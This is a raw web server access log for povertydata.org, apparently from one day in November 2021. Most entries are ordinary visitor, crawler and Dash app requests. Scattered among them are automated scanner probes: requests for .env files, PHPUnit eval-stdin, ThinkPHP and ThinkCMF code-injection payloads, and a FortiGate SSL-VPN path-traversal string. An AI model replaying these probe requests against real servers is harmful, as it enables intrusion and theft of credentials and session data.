94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /assets/iconmonstr-linkedin-1-64.png HTTP/1.1" 304 0 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /_dash-component-suites/dash_core_components/async-markdown.v1_15_0m1611086576.js HTTP/1.1" 200 59335 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:14 +0000] "GET /_dash-component-suites/dash_core_components/async-slider.v1_15_0m1611086576.js HTTP/1.1" 200 28563 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 200 3569 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 200 3623 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 200 2054 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:15 +0000] "POST /_dash-update-component HTTP/1.1" 200 43039 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
94.21.219.211 - - [17/Nov/2021:05:50:17 +0000] "GET /_dash-component-suites/dash_table/async-table.v4_11_2m1611087157.js HTTP/1.1" 200 92275 "https://povertydata.org/" "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
167.71.102.181 - - [17/Nov/2021:05:53:34 +0000] "\x00\x0E8\x8A\xA52v\xA3,[\xF3\x00\x00\x00\x00\x00" 400 166 "-" "-"
192.241.206.115 - - [17/Nov/2021:05:54:29 +0000] "GET /actuator/health HTTP/1.1" 200 13270 "-" "Mozilla/5.0 zgrab/0.x"
66.249.64.226 - - [17/Nov/2021:05:55:27 +0000] "GET /Honduras HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:05:55:28 +0000] "GET /Denmark HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:05:55:39 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Denmark" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:05:55:39 +0000] "POST /_dash-update-component HTTP/1.1" 200 85 "https://povertydata.org/Denmark" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:05:55:40 +0000] "POST /_dash-update-component HTTP/1.1" 200 2631 "https://povertydata.org/Denmark" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.173.35.17 - - [17/Nov/2021:06:16:37 +0000] "GET / HTTP/1.1" 200 144683 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
143.244.133.162 - - [17/Nov/2021:06:33:10 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03v\xAA{\xE7\x90\xEF^\x8B_\x89p\xED\x18\xAB\xF9\xC9\x97Z\xF9\x0CY87\x04\xBA\xE4\x97\xE1\xDEE\x97\xEB\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"
45.239.128.10 - - [17/Nov/2021:06:51:51 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
139.162.200.227 - - [17/Nov/2021:06:53:57 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
164.52.24.179 - - [17/Nov/2021:07:23:11 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03O\xC5Qh\xEDp\xF7\xDAB{\xC2\xD3\xA0g\xA5\xFD\xCC\xF3\x06\xFC(&e\xFF\xF1b\x0CX\xD7\xD08= P@\x00M@\x90~\x14\x17\x18;\xEE\x88MJb\xE5H\x01\xC0\xB5#\x17ga\x12\x1DLn]\xBCn\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"
164.52.24.179 - - [17/Nov/2021:07:23:12 +0000] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xB5#\xDE\xD7\xB2\x845cW\xBBo\x86p~\xDE\x1E\x19\x90{\xF6\xB3\x16\x81\xCE\xB1\x18M\x18)FNY\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"
164.52.24.179 - - [17/Nov/2021:07:23:12 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\xC8)\xDE\xC2f=\xB7d\xB5\x188\x80\xB2\x82\x0C\x92\xB91\xC5ol%D\xA0\x04\x9A\xA7\x10\xB9M\x17h\x00\x00\x12\xC0" 400 166 "-" "-"
164.52.24.179 - - [17/Nov/2021:07:23:13 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\xC3\xA1\xAD7\x8B\xC2\xE8ku\xF7K\xFE\xFE\xA7\xBB\xF4wJUV\x80\xB0nw\x16\xDA\x8B\xDD\xAD&\xBA1\x00\x00\x12\xC0" 400 166 "-" "-"
164.52.24.179 - - [17/Nov/2021:07:23:14 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
45.146.164.110 - - [17/Nov/2021:07:23:38 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.146.126 - - [17/Nov/2021:07:29:07 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.64.233 - - [17/Nov/2021:07:59:50 +0000] "GET /l/Nicaragua HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.149.125.173 - - [17/Nov/2021:08:03:13 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
178.62.59.163 - - [17/Nov/2021:08:07:44 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.59.163 - - [17/Nov/2021:08:07:47 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.203.75 - - [17/Nov/2021:08:18:00 +0000] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 200 13270 "-" "Mozilla/5.0 zgrab/0.x"
45.146.164.110 - - [17/Nov/2021:08:19:03 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
43.131.22.48 - - [17/Nov/2021:08:21:19 +0000] "GET / HTTP/1.1" 200 140756 "-" "-"
43.131.22.48 - - [17/Nov/2021:08:21:35 +0000] "GET / HTTP/1.0" 200 140756 "-" "-"
43.131.22.48 - - [17/Nov/2021:08:21:50 +0000] "GET / HTTP/1.1" 200 84276 "-" "-"
43.131.22.48 - - [17/Nov/2021:08:21:53 +0000] "OPTIONS / HTTP/1.0" 200 0 "-" "-"
91.241.19.243 - - [17/Nov/2021:08:34:28 +0000] "GET /cgi-bin/content.asp HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.44"
45.146.164.110 - - [17/Nov/2021:08:38:20 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.164.110 - - [17/Nov/2021:08:59:50 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
72.234.101.9 - - [17/Nov/2021:09:24:34 +0000] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 200 144683 "-" "Python-urllib/3.9"
157.230.216.203 - - [17/Nov/2021:09:26:13 +0000] "GET /ab2g HTTP/1.1" 400 166 "-" "-"
157.230.216.203 - - [17/Nov/2021:09:26:13 +0000] "GET /ab2h HTTP/1.1" 400 166 "-" "-"
138.68.249.116 - - [17/Nov/2021:09:39:37 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"
192.241.205.252 - - [17/Nov/2021:09:46:33 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 zgrab/0.x"
209.141.56.209 - - [17/Nov/2021:09:48:07 +0000] "GET / HTTP/1.1" 200 13270 "-" "Linux Gnu (cow)"
45.146.164.110 - - [17/Nov/2021:09:50:57 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.53.170.243 - - [17/Nov/2021:09:51:10 +0000] "GET /cgi-bin HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
66.249.64.233 - - [17/Nov/2021:09:53:27 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:09:54:08 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
45.146.164.110 - - [17/Nov/2021:10:08:19 +0000] "GET /console/ HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
139.59.235.12 - - [17/Nov/2021:10:12:41 +0000] "GET / HTTP/1.1" 200 141729 "-" "-"
74.82.47.2 - - [17/Nov/2021:10:30:49 +0000] "GET / HTTP/1.1" 200 144683 "-" "-"
66.249.64.251 - - [17/Nov/2021:10:38:28 +0000] "GET /North%20Macedonia HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
198.98.49.124 - - [17/Nov/2021:10:42:00 +0000] "GET /config/getuser?index=0 HTTP/1.1" 400 264 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
91.165.103.129 - - [17/Nov/2021:11:06:15 +0000] "GET / HTTP/1.1" 200 73673 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.64.231 - - [17/Nov/2021:11:06:16 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:11:06:17 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:11:06:17 +0000] "POST /_dash-update-component HTTP/1.1" 200 2054 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:11:06:18 +0000] "POST /_dash-update-component HTTP/1.1" 200 43039 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:11:06:18 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:11:06:19 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.233 - - [17/Nov/2021:11:06:20 +0000] "POST /_dash-update-component HTTP/1.1" 200 3569 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.229 - - [17/Nov/2021:11:06:20 +0000] "POST /_dash-update-component HTTP/1.1" 200 3623 "http://povertydata.org/l/Nicaragua" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.164.110 - - [17/Nov/2021:11:08:54 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 405 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.64.226 - - [17/Nov/2021:11:11:47 +0000] "GET /Kyrgyz%20Republic HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:11:13:24 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Kyrgyz%20Republic" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:11:13:25 +0000] "POST /_dash-update-component HTTP/1.1" 200 93 "https://povertydata.org/Kyrgyz%20Republic" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:11:13:26 +0000] "POST /_dash-update-component HTTP/1.1" 200 2619 "https://povertydata.org/Kyrgyz%20Republic" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
52.19.164.183 - - [17/Nov/2021:11:22:58 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0"
45.132.254.226 - - [17/Nov/2021:11:37:03 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:11:45:06 +0000] "GET /Burundi HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:12:03:01 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Burundi" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:12:03:02 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "https://povertydata.org/Burundi" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:12:03:02 +0000] "POST /_dash-update-component HTTP/1.1" 200 85 "https://povertydata.org/Burundi" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:12:03:03 +0000] "POST /_dash-update-component HTTP/1.1" 200 2669 "https://povertydata.org/Burundi" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.165.16.111 - - [17/Nov/2021:12:17:15 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
194.165.16.111 - - [17/Nov/2021:12:17:17 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"
66.249.64.253 - - [17/Nov/2021:12:18:28 +0000] "GET /Benin HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.48.199.121 - - [17/Nov/2021:12:21:40 +0000] "GET /sitecore/shell/ClientBin/Reporting/Report.ashx HTTP/1.1" 200 13270 "-" "curl/7.64.1"
66.249.64.226 - - [17/Nov/2021:12:22:31 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Benin" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:12:22:31 +0000] "POST /_dash-update-component HTTP/1.1" 200 83 "https://povertydata.org/Benin" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:12:22:32 +0000] "POST /_dash-update-component HTTP/1.1" 200 2677 "https://povertydata.org/Benin" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
23.129.64.213 - - [17/Nov/2021:12:29:26 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
209.141.45.189 - - [17/Nov/2021:12:29:29 +0000] "GET /favicon.ico HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
114.119.129.92 - - [17/Nov/2021:12:42:27 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.64.253 - - [17/Nov/2021:12:51:51 +0000] "GET /Ireland HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:12:51:56 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Ireland" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:12:51:57 +0000] "POST /_dash-update-component HTTP/1.1" 200 85 "https://povertydata.org/Ireland" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:12:51:57 +0000] "POST /_dash-update-component HTTP/1.1" 200 2804 "https://povertydata.org/Ireland" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
5.235.190.102 - - [17/Nov/2021:13:10:14 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
54.36.149.47 - - [17/Nov/2021:13:12:37 +0000] "GET /robots.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
54.36.148.66 - - [17/Nov/2021:13:12:37 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
186.33.76.131 - - [17/Nov/2021:13:24:05 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:13:25:13 +0000] "GET /Ireland HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.233.79.30 - - [17/Nov/2021:13:26:11 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
66.249.64.251 - - [17/Nov/2021:13:26:55 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Ireland" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
